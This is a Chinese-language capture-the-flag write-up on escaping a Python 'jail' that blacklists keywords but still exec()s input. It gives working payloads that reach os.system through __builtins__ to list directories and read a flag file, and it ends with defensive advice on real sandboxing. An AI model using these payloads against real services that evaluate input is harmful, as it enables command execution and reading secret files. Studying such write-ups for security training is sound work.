# PyJail

## 题目简述

服务读取一行输入，拒绝包含 eval、exec、rm、kill 或加号的字符串，然后仍把整行交给 exec 执行。Python 内建对象和导入能力没有被移除，黑名单也没有限制函数调用，因此可以通过 __builtins__ 间接导入 os 并执行系统命令。

## 解题过程

不能在输入中直接出现被禁词 exec，但无需再次调用 exec：服务外层已经会执行整条表达式。通过内建字典取出 __import__，导入 os 后再从模块字典取 system：

~~~python
__builtins__.__dict__['__import__']('os').__dict__['system']('ls')
~~~

先枚举目录确认 flag 位于 /secrets/flag/topsecret.txt，再发送：

~~~python
__builtins__.__dict__['__import__']('os').__dict__['system']('cat /secrets/flag/topsecret.txt')
~~~

字符串不含黑名单中的任一片段，外层 exec 会正常执行 system，输出：

~~~text
maple{welc0m3_to_the_w0rlD_oF_cod3_j4ilz}
~~~

## 方法总结

对 Python 源码做子串黑名单无法形成沙箱。只要任意表达式仍能访问 builtins、对象属性或导入机制，就有大量等价路径到文件和命令执行。安全设计应使用进程/容器级隔离、最小文件权限和系统调用限制；若只需要表达式求值，还应解析 AST 并采用严格白名单。
